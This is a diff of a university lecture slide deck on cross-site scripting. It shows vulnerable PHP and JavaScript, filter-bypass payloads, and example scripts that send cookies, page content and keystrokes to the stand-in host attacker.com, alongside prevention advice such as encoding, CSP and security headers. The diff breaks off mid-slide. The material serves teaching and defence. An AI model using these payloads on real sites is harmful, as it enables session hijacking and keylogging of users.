@@ -1,295 +1,41 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
+    <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Session 5: WEB-XSS-01 - Cross-Site Scripting</title>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.3.1/dist/reveal.css">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.3.1/dist/theme/white.css">
-    <style>
-        /* Global slide styling */
-        .reveal .slides section {
-            text-align: left;
-            padding: 20px;
-            box-sizing: border-box;
-            overflow-y: auto;
-            max-height: 100vh;
-        }
+    <title>CMU540 - Session 5: WEB-XSS-01 - Cross-Site Scripting</title>
 
-        .reveal .slides section.center {
-            text-align: center;
-        }
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.0.4/dist/reset.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.0.4/dist/reveal.css">
+    <link rel="stylesheet" href="../../placeholder/academic-theme.css">
 
-        /* Ensure content fits within viewport */
-        .reveal .slides section h1 {
-            font-size: 2.5em;
-            margin-bottom: 0.5em;
-        }
-
-        .reveal .slides section h2 {
-            font-size: 2em;
-            margin-bottom: 0.5em;
-        }
-
-        .reveal .slides section h3 {
-            font-size: 1.5em;
-            margin-bottom: 0.5em;
-        }
-
-        .reveal .slides section p {
-            font-size: 1.1em;
-            line-height: 1.4;
-            margin-bottom: 0.8em;
-        }
-
-        .reveal .slides section ul,
-        .reveal .slides section ol {
-            font-size: 1em;
-            line-height: 1.4;
-            margin-bottom: 0.8em;
-        }
-
-        .reveal .slides section li {
-            margin-bottom: 0.3em;
-        }
-
-        /* Task box styling */
-        .task-box {
-            background: #e3f2fd;
-            border: 2px solid #2196f3;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px 0;
-            max-height: 60vh;
-            overflow-y: auto;
-        }
-
-        /* Code example styling */
-        .code-example {
-            background: #f5f5f5;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            padding: 15px;
-            font-family: 'Courier New', monospace;
-            margin: 10px 0;
-            font-size: 0.9em;
-            line-height: 1.3;
-            max-height: 40vh;
-            overflow-y: auto;
-        }
-
-        /* Highlight styling */
-        .highlight {
-            background: #fff3cd;
-            padding: 10px;
-            border-radius: 5px;
-            border-left: 4px solid #ffc107;
-            margin: 10px 0;
-        }
-
-        /* Timeline info styling */
-        .timeline-info {
-            background: #f8f9fa;
-            border: 1px solid #dee2e6;
-            border-radius: 8px;
-            padding: 15px;
-            margin: 20px 0;
-            font-size: 0.9em;
-        }
-
-        .timeline-info ul {
-            margin: 10px 0;
-            padding-left: 20px;
-        }
-
-        .timeline-info li {
-            margin-bottom: 0.2em;
-        }
-
-        /* OS³ Studio specific styling */
-        .os3-studio {
-            background: #e3f2fd;
-            border: 2px solid #2196f3;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px 0;
-            max-height: 60vh;
-            overflow-y: auto;
-        }
-
-        /* Vulnerability examples */
-        .vulnerability {
-            background: #ffebee;
-            border: 2px solid #f44336;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px 0;
-            max-height: 60vh;
-            overflow-y: auto;
-        }
-
-        /* Career focus styling */
-        .career-box {
-            background: #f0f8ff;
-            border: 2px solid #007bff;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px 0;
-            max-height: 60vh;
-            overflow-y: auto;
-        }
-
-        /* Demo links styling */
-        .demo-link {
-            background: #fff3cd;
-            border: 2px solid #ffc107;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px 0;
-            max-height: 60vh;
-            overflow-y: auto;
-        }
-
-        /* Responsive design */
-        @media (max-width: 768px) {
-            .reveal .slides section {
-                padding: 15px;
-            }
-
-            .reveal .slides section h1 {
-                font-size: 2em;
-            }
-
-            .reveal .slides section h2 {
-                font-size: 1.6em;
-            }
-
-            .reveal .slides section h3 {
-                font-size: 1.3em;
-            }
-
-            .task-box,
-            .code-example {
-                font-size: 0.9em;
-                padding: 15px;
-            }
-        }
-
-        /* Custom scrollbar for better UX */
-        .reveal .slides section::-webkit-scrollbar,
-        .task-box::-webkit-scrollbar,
-        .code-example::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        .reveal .slides section::-webkit-scrollbar-track,
-        .task-box::-webkit-scrollbar-track,
-        .code-example::-webkit-scrollbar-track {
-            background: #f1f1f1;
-            border-radius: 4px;
-        }
-
-        .reveal .slides section::-webkit-scrollbar-thumb,
-        .task-box::-webkit-scrollbar-thumb,
-        .code-example::-webkit-scrollbar-thumb {
-            background: #888;
-            border-radius: 4px;
-        }
-
-        .reveal .slides section::-webkit-scrollbar-thumb:hover,
-        .task-box::-webkit-scrollbar-thumb:hover,
-        .code-example::-webkit-scrollbar-thumb:hover {
-            background: #555;
-        }
-
-        /* Interactive content styling */
-        .interactive-content {
-            margin-top: 20px;
-            text-align: center;
-        }
-
-        .interactive-content h3 {
-            color: #2196f3;
-            margin-bottom: 15px;
-            font-size: 1.3em;
-        }
-
-        .video-container,
-        .codepen-container {
-            position: relative;
-            width: 100%;
-            max-width: 560px;
-            margin: 0 auto;
-        }
-
-        .video-container iframe,
-        .codepen-container iframe {
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-            transition: transform 0.3s ease;
-        }
-
-        .video-container iframe:hover,
-        .codepen-container iframe:hover {
-            transform: scale(1.02);
-        }
-
-        .interactive-description {
-            font-size: 0.9em;
-            color: #666;
-            margin-top: 10px;
-            font-style: italic;
-        }
-    </style>
+    <!-- Syntax highlighting -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.0.4/plugin/highlight/monokai.css">
 </head>
 
 <body>
-    <div style="position: fixed; top: 20px; left: 20px; z-index: 1000;">
-        <a href="../index.html" style="
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                color: white;
-                padding: 12px 20px;
-                border-radius: 25px;
-                text-decoration: none;
-                font-weight: 600;
-                font-size: 14px;
-                box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
-                transition: all 0.3s ease;
-                display: inline-block;
-            "
-            onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 20px rgba(102, 126, 234, 0.4)'"
-            onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 4px 15px rgba(102, 126, 234, 0.3)'">
-            ← Back to Module
-        </a>
+        <div class="slide-nav">
+        <a href="../../index.html" title="Home">H</a>
+        <a href="../index.html" title="Module Home">M</a>
+        <a href="session4.html" title="Previous Session">&lt;</a>
+        <a href="session6.html" title="Next Session">&gt;</a>
     </div>
     <div class="reveal">
         <div class="slides">
-            <!-- Slide 1: Title -->
-            <section class="center">
-                <h1>WEB-XSS-01</h1>
-                <h2>Cross-Site Scripting</h2>
-                <h3>CMU540: Cyber Security - Session 5</h3>
-                <p><strong>Birmingham Newman University</strong></p>
-                <p><em>Lecturer: James Williams</em></p>
-                <p>Understanding XSS vulnerabilities and client-side security</p>
-                <p><small>3-hour session • 30 slides • 2 interactive tasks</small></p>
-                <div class="timeline-info">
-                    <p><strong>Session Timeline:</strong></p>
-                    <ul>
-                        <li>10 min: Registration & waiting</li>
-                        <li>20 min: Opening slides</li>
-                        <li>45 min: Task 1</li>
-                        <li>15 min: Break/Catch up</li>
-                        <li>20 min: Secondary slides</li>
-                        <li>45 min: Task 2</li>
-                        <li>Remaining: Self-study</li>
-                    </ul>
+
+            <!-- Title Slide -->
+            <section class="title-slide" data-slide-title="Title Slide">
+                <div class="module-code">CMU540</div>
+                <h1>WEB-XSS-01 - Cross-Site Scripting</h1>
+                <h2>Session 5</h2>
+                <div class="author">
+                    <p><strong>James Williams</strong></p>
+                    <p><a href="mailto:jwilliams@staff.newman.ac.uk">jwilliams@staff.newman.ac.uk</a></p>
                 </div>
             </section>
 
-            <!-- Slide 2: Learning Objectives -->
-            <section>
+            <section data-slide-title="Learning Objectives">
                 <h2>Learning Objectives</h2>
                 <ul>
                     <li>Understand OWASP A03: Cross-Site Scripting (XSS)</li>
@@ -301,8 +47,7 @@
                 </ul>
             </section>
 
-            <!-- Slide 3: OWASP A03 Overview -->
-            <section>
+            <section data-slide-title="OWASP A03: Cross-Site Scripting (XSS)">
                 <h2>OWASP A03: Cross-Site Scripting (XSS)</h2>
                 <div class="highlight">
                     <p><strong>Definition:</strong> XSS occurs when malicious scripts are injected into web applications and executed in users' browsers.</p>
@@ -316,8 +61,7 @@
                 </ul>
             </section>
 
-            <!-- Slide 4: Real-World Impact -->
-            <section>
+            <section data-slide-title="Real-World Impact">
                 <h2>Real-World Impact</h2>
                 <div class="vulnerability">
                     <h3>Notable XSS Attacks:</h3>
@@ -330,137 +74,129 @@
                 </div>
             </section>
 
-            <!-- Slide 5: Reflected XSS -->
-            <section>
+            <section data-slide-title="Reflected XSS (Non-Persistent)">
                 <h2>Reflected XSS (Non-Persistent)</h2>
                 <h3>Attack Scenario:</h3>
                 <div class="code-example">
-&lt;!-- VULNERABLE: Reflected XSS --&gt;<br>
-&lt;div&gt;Search results for: &lt;?php echo $_GET['q']; ?&gt;&lt;/div&gt;<br><br>
-&lt;!-- Malicious URL --&gt;<br>
-https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;<br><br>
-&lt;!-- Result --&gt;<br>
-&lt;div&gt;Search results for: &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/div&gt;
+                    <pre><code class="language-html">&lt;!-- VULNERABLE: Reflected XSS --&gt;
+&lt;div&gt;Search results for: &lt;?php echo $_GET['q']; ?&gt;&lt;/div&gt;
+&lt;!-- Malicious URL --&gt;
+https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;!-- Result --&gt;
+&lt;div&gt;Search results for: &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/div&gt;</code></pre>
                 </div>
                 <div class="highlight">
                     <p><strong>Characteristics:</strong> Script is reflected immediately, not stored</p>
                 </div>
             </section>
 
-            <!-- Slide 6: Stored XSS -->
-            <section>
+            <section data-slide-title="Stored XSS (Persistent)">
                 <h2>Stored XSS (Persistent)</h2>
                 <h3>Attack Scenario:</h3>
                 <div class="code-example">
-&lt;!-- VULNERABLE: Stored XSS --&gt;<br>
-&lt;div class="comment"&gt;&lt;?php echo $comment['text']; ?&gt;&lt;/div&gt;<br><br>
-&lt;!-- Malicious comment --&gt;<br>
-&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;<br><br>
-&lt;!-- Result: Executed for every visitor --&gt;<br>
-&lt;div class="comment"&gt;&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;&lt;/div&gt;
+                    <pre><code class="language-html">&lt;!-- VULNERABLE: Stored XSS --&gt;
+&lt;div class="comment"&gt;&lt;?php echo $comment['text']; ?&gt;&lt;/div&gt;
+&lt;!-- Malicious comment --&gt;
+&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;
+&lt;!-- Result: Executed for every visitor --&gt;
+&lt;div class="comment"&gt;&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;&lt;/div&gt;</code></pre>
                 </div>
                 <div class="vulnerability">
                     <p><strong>Characteristics:</strong> Script is stored and executed for all visitors</p>
                 </div>
             </section>
 
-            <!-- Slide 7: DOM-based XSS -->
-            <section>
+            <section data-slide-title="DOM-based XSS">
                 <h2>DOM-based XSS</h2>
                 <h3>Attack Scenario:</h3>
                 <div class="code-example">
-&lt;!-- VULNERABLE: DOM-based XSS --&gt;<br>
-&lt;script&gt;<br>
-&nbsp;&nbsp;var hash = location.hash.substring(1);<br>
-&nbsp;&nbsp;document.getElementById('content').innerHTML = hash;<br>
-&lt;/script&gt;<br><br>
-&lt;!-- Malicious URL --&gt;<br>
-https://example.com/page#&lt;img src=x onerror=alert('XSS')&gt;<br><br>
-&lt;!-- Result: Script executed via DOM manipulation --&gt;
+                    <pre><code class="language-javascript">&lt;!-- VULNERABLE: DOM-based XSS --&gt;
+&lt;script&gt;
+  var hash = location.hash.substring(1);
+  document.getElementById('content').innerHTML = hash;
+&lt;/script&gt;
+&lt;!-- Malicious URL --&gt;
+https://example.com/page#&lt;img src=x onerror=alert('XSS')&gt;
+&lt;!-- Result: Script executed via DOM manipulation --&gt;</code></pre>
                 </div>
                 <div class="highlight">
                     <p><strong>Characteristics:</strong> Vulnerability exists in client-side JavaScript</p>
                 </div>
             </section>
 
-            <!-- Slide 8: Blind XSS -->
-            <section>
+            <section data-slide-title="Blind XSS">
                 <h2>Blind XSS</h2>
                 <h3>Attack Scenario:</h3>
                 <div class="code-example">
-&lt;!-- VULNERABLE: Blind XSS --&gt;<br>
-&lt;!-- Admin panel logs user input --&gt;<br>
-&lt;div class="log-entry"&gt;&lt;?php echo $log['user_input']; ?&gt;&lt;/div&gt;<br><br>
-&lt;!-- Malicious payload in user profile --&gt;<br>
-&lt;script&gt;fetch('http://attacker.com/steal?data='+document.body.innerHTML)&lt;/script&gt;<br><br>
-&lt;!-- Result: Executed when admin views logs --&gt;
+                    <pre><code class="language-html">&lt;!-- VULNERABLE: Blind XSS --&gt;
+&lt;!-- Admin panel logs user input --&gt;
+&lt;div class="log-entry"&gt;&lt;?php echo $log['user_input']; ?&gt;&lt;/div&gt;
+&lt;!-- Malicious payload in user profile --&gt;
+&lt;script&gt;fetch('http://attacker.com/steal?data='+document.body.innerHTML)&lt;/script&gt;
+&lt;!-- Result: Executed when admin views logs --&gt;</code></pre>
                 </div>
                 <div class="vulnerability">
                     <p><strong>Characteristics:</strong> Script executes in a different context (admin panel)</p>
                 </div>
             </section>
 
-            <!-- Slide 9: XSS Attack Vectors -->
-            <section>
+            <section data-slide-title="Common XSS Attack Vectors">
                 <h2>Common XSS Attack Vectors</h2>
                 <h3>1. Basic Script Injection</h3>
                 <div class="code-example">
-&lt;script&gt;alert('XSS')&lt;/script&gt;<br>
-&lt;img src=x onerror=alert('XSS')&gt;<br>
-&lt;svg onload=alert('XSS')&gt;&lt;/svg&gt;<br>
-&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;
+                    <pre><code class="language-plaintext">&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg onload=alert('XSS')&gt;&lt;/svg&gt;
+&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</code></pre>
                 </div>
                 <h3>2. Event Handlers</h3>
                 <div class="code-example">
-&lt;div onmouseover="alert('XSS')"&gt;Hover me&lt;/div&gt;<br>
-&lt;input onfocus="alert('XSS')"&gt;<br>
-&lt;body onload="alert('XSS')"&gt;
+                    <pre><code class="language-html">&lt;div onmouseover="alert('XSS')"&gt;Hover me&lt;/div&gt;
+&lt;input onfocus="alert('XSS')"&gt;
+&lt;body onload="alert('XSS')"&gt;</code></pre>
                 </div>
             </section>
 
-            <!-- Slide 10: Advanced XSS Techniques -->
-            <section>
+            <section data-slide-title="Advanced XSS Techniques">
                 <h2>Advanced XSS Techniques</h2>
                 <h3>1. Bypassing Filters</h3>
                 <div class="code-example">
-&lt;!-- Case variation --&gt;<br>
-&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;<br><br>
-&lt;!-- Encoding --&gt;<br>
-&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;<br><br>
-&lt;!-- Alternative syntax --&gt;<br>
-&lt;script&gt;alert`XSS`&lt;/script&gt;
+                    <pre><code class="language-plaintext">&lt;!-- Case variation --&gt;
+&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;
+&lt;!-- Encoding --&gt;
+&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
+&lt;!-- Alternative syntax --&gt;
+&lt;script&gt;alert`XSS`&lt;/script&gt;</code></pre>
                 </div>
                 <h3>2. Context-Aware Payloads</h3>
                 <div class="code-example">
-&lt;!-- Inside HTML attribute --&gt;<br>
-&lt;input value="&quot;&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;"&gt;<br><br>
-&lt;!-- Inside JavaScript --&gt;<br>
-&lt;script&gt;var name = '&lt;/script&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;';&lt;/script&gt;
+                    <pre><code class="language-html">&lt;!-- Inside HTML attribute --&gt;
+&lt;input value=""&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;"&gt;
+&lt;!-- Inside JavaScript --&gt;
+&lt;script&gt;var name = '&lt;/script&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;';&lt;/script&gt;</code></pre>
                 </div>
             </section>
 
-            <!-- Slide 11: XSS Impact -->
-            <section>
+            <section data-slide-title="XSS Attack Impact">
                 <h2>XSS Attack Impact</h2>
                 <h3>1. Session Hijacking</h3>
                 <div class="code-example">
-&lt;script&gt;<br>
-&nbsp;&nbsp;var img = new Image();<br>
-&nbsp;&nbsp;img.src = 'http://attacker.com/steal.php?cookie=' + document.cookie;<br>
-&lt;/script&gt;
+                    <pre><code class="language-javascript">&lt;script&gt;
+  var img = new Image();
+  img.src = 'http://attacker.com/steal.php?cookie=' + document.cookie;
+&lt;/script&gt;</code></pre>
                 </div>
                 <h3>2. Keylogger</h3>
                 <div class="code-example">
-&lt;script&gt;<br>
-&nbsp;&nbsp;document.addEventListener('keypress', function(e) {<br>
-&nbsp;&nbsp;&nbsp;&nbsp;fetch('http://attacker.com/log?key=' + e.key);<br>
-&nbsp;&nbsp;});<br>
-&lt;/script&gt;
+                    <pre><code class="language-javascript">&lt;script&gt;
+  document.addEventListener('keypress', function(e) {
+    fetch('http://attacker.com/log?key=' + e.key);
+  });
+&lt;/script&gt;</code></pre>
                 </div>
             </section>
 
-            <!-- Slide 12: Career Opportunities -->
-            <section>
+            <section data-slide-title="Career Opportunities in Web Security">
                 <h2>Career Opportunities in Web Security</h2>
                 <div class="career-box">
                     <h3>Web Security Roles:</h3>
@@ -475,8 +211,7 @@ https://example.com/page#&lt;img src=x onerror=alert('XSS')&gt;<br><br>
                 </div>
             </section>
 
-            <!-- Slide 13: Industry Certifications -->
-            <section>
+            <section data-slide-title="Industry Certifications">
                 <h2>Industry Certifications</h2>
                 <h3>Web Security Certifications:</h3>
                 <ul>
@@ -491,8 +226,7 @@ https://example.com/page#&lt;img src=x onerror=alert('XSS')&gt;<br><br>
                 </div>
             </section>
 
-            <!-- Slide 14: OS³ Studio Introduction -->
-            <section>
+            <section data-slide-title="OS³ Newman Cyber Security Lab">
                 <h2>OS³ Newman Cyber Security Lab</h2>
                 <div class="os3-studio">
                     <h3>WEB-XSS-01 Lab Environment</h3>
@@ -507,8 +241,7 @@ https://example.com/page#&lt;img src=x onerror=alert('XSS')&gt;<br><br>
                 </div>
             </section>
 
-            <!-- Slide 15: Practical Examples -->
-            <section>
+            <section data-slide-title="Practical Examples">
                 <h2>Practical Examples</h2>
                 <div class="interactive-content">
                     <h3>Watch: XSS Vulnerabilities Explained</h3>
@@ -519,8 +252,7 @@ https://example.com/page#&lt;img src=x onerror=alert('XSS')&gt;<br><br>
                 </div>
             </section>
 
-            <!-- Slide 16: Web Demos and Tools -->
-            <section>
+            <section data-slide-title="Web Demos and Tools">
                 <h2>Web Demos and Tools</h2>
                 <div class="demo-link">
                     <h3>XSS Testing Tools:</h3>
@@ -534,8 +266,7 @@ https://example.com/page#&lt;img src=x onerror=alert('XSS')&gt;<br><br>
                 </div>
             </section>
 
-            <!-- Slide 17: Case Study -->
-            <section>
+            <section data-slide-title="Case Study: Samy Worm">
                 <h2>Case Study: Samy Worm</h2>
                 <div class="vulnerability">
                     <h3>MySpace XSS Worm (2005)</h3>
@@ -549,8 +280,7 @@ https://example.com/page#&lt;img src=x onerror=alert('XSS')&gt;<br><br>
                 </div>
             </section>
 
-            <!-- Slide 18: Summary of Vulnerabilities -->
-            <section>
+            <section data-slide-title="Summary: Common XSS Vulnerabilities">
                 <h2>Summary: Common XSS Vulnerabilities</h2>
                 <div class="highlight">
                     <h3>Key Vulnerabilities to Look For:</h3>
@@ -566,8 +296,7 @@ https://example.com/page#&lt;img src=x onerror=alert('XSS')&gt;<br><br>
                 </div>
             </section>
 
-            <!-- Task 1: Vulnerability Discovery -->
-            <section>
+            <section data-slide-title="Task 1: XSS Vulnerability Discovery">
                 <h2>Task 1: XSS Vulnerability Discovery</h2>
                 <div class="task-box">
                     <h3>Objective:</h3>
@@ -589,8 +318,7 @@ https://example.com/page#&lt;img src=x onerror=alert('XSS')&gt;<br><br>
                 </div>
             </section>
 
-            <!-- Slide 19: Break/Catch Up -->
-            <section class="center">
+            <section class="center" data-slide-title="Break Time">
                 <h2>Break Time</h2>
                 <div class="highlight">
                     <h3>15 Minutes</h3>
@@ -599,125 +327,123 @@ https://example.com/page#&lt;img src=x onerror=alert('XSS')&gt;<br><br>
                 </div>
             </section>
 
-            <!-- Slide 20: Secure XSS Prevention -->
-            <section>
+            <section data-slide-title="Secure XSS Prevention">
                 <h2>Secure XSS Prevention</h2>
                 
                 <h3>1. Output Encoding</h3>
                 <div class="code-example">
-&lt;!-- SECURE: HTML encoding --&gt;<br>
-&lt;?php echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8'); ?&gt;<br><br>
-&lt;!-- SECURE: JavaScript encoding --&gt;<br>
-&lt;script&gt;<br>
-&nbsp;&nbsp;var userData = &lt;?php echo json_encode($user_input); ?&gt;;<br>
-&lt;/script&gt;<br><br>
-&lt;!-- SECURE: URL encoding --&gt;<br>
-&lt;a href="profile.php?id=&lt;?php echo urlencode($user_id); ?&gt;"&gt;Profile&lt;/a&gt;
+                    <pre><code class="language-javascript">&lt;!-- SECURE: HTML encoding --&gt;
+&lt;?php echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8'); ?&gt;
+&lt;!-- SECURE: JavaScript encoding --&gt;
+&lt;script&gt;
+  var userData = &lt;?php echo json_encode($user_input); ?&gt;;
+&lt;/script&gt;
+&lt;!-- SECURE: URL encoding --&gt;
+&lt;a href="profile.php?id=&lt;?php echo urlencode($user_id); ?&gt;"&gt;Profile&lt;/a&gt;</code></pre>
                 </div>
 
                 <h3>2. Input Validation</h3>
                 <div class="code-example">
-&lt;!-- SECURE: Input validation --&gt;<br>
-function validateInput(input) {<br>
-&nbsp;&nbsp;if (typeof input !== 'string') return false;<br>
-&nbsp;&nbsp;if (input.length > 1000) return false;<br>
-&nbsp;&nbsp;// Allow only alphanumeric and safe characters<br>
-&nbsp;&nbsp;return /^[a-zA-Z0-9\s.,!?-]+$/.test(input);<br>}
+                    <pre><code class="language-javascript">&lt;!-- SECURE: Input validation --&gt;
+function validateInput(input) {
+  if (typeof input !== 'string') return false;
+  if (input.length &gt; 1000) return false;
+  // Allow only alphanumeric and safe characters
+  return /^[a-zA-Z0-9\s.,!?-]+$/.test(input);
+}</code></pre>
                 </div>
             </section>
 
-            <!-- Slide 21: Content Security Policy -->
-            <section>
+            <section data-slide-title="Content Security Policy (CSP)">
                 <h2>Content Security Policy (CSP)</h2>
                 
                 <h3>1. CSP Implementation</h3>
                 <div class="code-example">
-&lt;!-- SECURE: CSP header --&gt;<br>
-Content-Security-Policy: default-src 'self';<br>
-&nbsp;&nbsp;script-src 'self' 'unsafe-inline';<br>
-&nbsp;&nbsp;style-src 'self' 'unsafe-inline';<br>
-&nbsp;&nbsp;img-src 'self' data: https:;<br>
-&nbsp;&nbsp;connect-src 'self';<br>
-&nbsp;&nbsp;frame-ancestors 'none';<br>
-&nbsp;&nbsp;base-uri 'self';<br>
-&nbsp;&nbsp;form-action 'self'
+                    <pre><code class="language-plaintext">&lt;!-- SECURE: CSP header --&gt;
+Content-Security-Policy: default-src 'self';
+  script-src 'self' 'unsafe-inline';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+  connect-src 'self';
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'self'</code></pre>
                 </div>
 
                 <h3>2. CSP Nonce Implementation</h3>
                 <div class="code-example">
-&lt;!-- SECURE: CSP with nonce --&gt;<br>
-&lt;meta http-equiv="Content-Security-Policy" content="script-src 'nonce-<?php echo $nonce; ?>'"&gt;<br>
-&lt;script nonce="&lt;?php echo $nonce; ?&gt;"&gt;<br>
-&nbsp;&nbsp;// Only scripts with matching nonce execute<br>
-&lt;/script&gt;
+                    <pre><code class="language-php">&lt;!-- SECURE: CSP with nonce --&gt;
+&lt;meta http-equiv="Content-Security-Policy" content="script-src 'nonce-&lt;?php echo $nonce; ?&gt;'"&gt;
+&lt;script nonce="&lt;?php echo $nonce; ?&gt;"&gt;
+  // Only scripts with matching nonce execute
+&lt;/script&gt;</code></pre>
                 </div>
             </section>
 
-            <!-- Slide 22: Secure JavaScript Practices -->
-            <section>
+            <section data-slide-title="Secure JavaScript Practices">
                 <h2>Secure JavaScript Practices</h2>
                 
                 <h3>1. Safe DOM Manipulation</h3>
                 <div class="code-example">
-&lt;!-- SECURE: Safe DOM manipulation --&gt;<br>
-// Good: Use textContent instead of innerHTML<br>
-element.textContent = userInput;<br><br>
-// Good: Use createElement and appendChild<br>
-var div = document.createElement('div');<br>
-div.textContent = userInput;<br>
-parentElement.appendChild(div);<br><br>
-// Bad: innerHTML allows script execution<br>
-element.innerHTML = userInput;
+                    <pre><code class="language-javascript">&lt;!-- SECURE: Safe DOM manipulation --&gt;
+// Good: Use textContent instead of innerHTML
+element.textContent = userInput;
+// Good: Use createElement and appendChild
+var div = document.createElement('div');
+div.textContent = userInput;
+parentElement.appendChild(div);
+// Bad: innerHTML allows script execution
+element.innerHTML = userInput;</code></pre>
                 </div>
 
                 <h3>2. Safe Event Handling</h3>
                 <div class="code-example">
-&lt;!-- SECURE: Event delegation --&gt;<br>
-document.addEventListener('click', function(e) {<br>
-&nbsp;&nbsp;if (e.target.matches('.safe-button')) {<br>
-&nbsp;&nbsp;&nbsp;&nbsp;handleClick(e.target);<br>
-&nbsp;&nbsp;}<br>});
+                    <pre><code class="language-javascript">&lt;!-- SECURE: Event delegation --&gt;
+document.addEventListener('click', function(e) {
+  if (e.target.matches('.safe-button')) {
+    handleClick(e.target);
+  }
+});</code></pre>
                 </div>
             </section>
 
-            <!-- Slide 23: HTTP Security Headers -->
-            <section>
+            <section data-slide-title="HTTP Security Headers">
                 <h2>HTTP Security Headers</h2>
                 
                 <h3>1. XSS Protection Headers</h3>
                 <div class="code-example">
-&lt;!-- SECURE: XSS protection headers --&gt;<br>
-X-XSS-Protection: 1; mode=block<br>
-X-Content-Type-Options: nosniff<br>
-X-Frame-Options: DENY<br>
-Referrer-Policy: strict-origin-when-cross-origin<br>
-Permissions-Policy: geolocation=(), microphone=(), camera=()
+                    <pre><code class="language-plaintext">&lt;!-- SECURE: XSS protection headers --&gt;
+X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: geolocation=(), microphone=(), camera=()</code></pre>
                 </div>
 
                 <h3>2. Implementation</h3>
                 <div class="code-example">
-&lt;!-- SECURE: Express.js headers --&gt;<br>
-app.use((req, res, next) => {<br>
-&nbsp;&nbsp;res.setHeader('X-XSS-Protection', '1; mode=block');<br>
-&nbsp;&nbsp;res.setHeader('X-Content-Type-Options', 'nosniff');<br>
-&nbsp;&nbsp;res.setHeader('X-Frame-Options', 'DENY');<br>
-&nbsp;&nbsp;res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');<br>
-&nbsp;&nbsp;next();<br>});
+                    <pre><code class="language-javascript">&lt;!-- SECURE: Express.js headers --&gt;
+app.use((req, res, next) =&gt; {
+  res.setHeader('X-XSS-Protection', '1; mode=block');
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('X-Frame-Options', 'DENY');
+  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+  next();
+});</code></pre>
                 </div>
             </section>
 
-            <!-- Slide 24: Template Security -->
-            <section>
+            <section data-slide-title="Template Security">
                 <h2>Template Security</h2>
                 
                 <h3>1. Safe Template Engines</h3>
                 <div class="code-example">
-&lt;!-- SECURE: Handlebars auto-escaping --&gt;<br>
-&lt;div&gt;{{userInput}}&lt;/div&gt;  &lt;!-- Auto-escaped --&gt;<br>
-&lt;div&gt;{{{userInput}}}&lt;/div&gt; &lt;!-- Raw HTML (dangerous) --&gt;<br><br>
-&lt;!-- SECURE: Jinja2 auto-escaping --&gt;<br>
-&lt;div&gt;{{ user_input }}&lt;/div&gt;  &lt;!-- Auto-escaped --&gt;<br>
-&lt;div&gt;{{ user_input|safe }}&lt;/div&gt; &lt;!-- Raw HTML (dangerous) --&gt;
+                    <pre><code class="language-html">&lt;!-- SECURE: Handlebars auto-escaping --&gt;
+&lt;div&gt;{{userInput}}&lt;/div&gt;  &lt;!-- Auto-escaped --&gt;
+&lt;div&gt;{{{userInput}}}&lt;/div&gt; &lt;!-- Raw HTML (dangerous) --&gt;
+&lt;!-- SECURE: Jinja2 auto-escaping --&gt;
+&lt;div&gt;{{ user_input }}&lt;/div&gt;  &lt;!-- Auto-escaped --&gt;
+&lt;div&gt;{{ user_input|safe }}&lt;/div&gt; &lt;!-- Raw HTML (dangerous) --&gt;</code></pre>
                 </div>
 
                 <h3>2. Template Context</h3>
@@ -729,47 +455,46 @@ app.use((req, res, next) => {<br>
                 </ul>
             </section>
 
-            <!-- Slide 25: Client-Side Security -->
-            <section>
+            <section data-slide-title="Client-Side Security">
                 <h2>Client-Side Security</h2>
                 
                 <h3>1. Safe Data Handling</h3>
                 <div class="code-example">
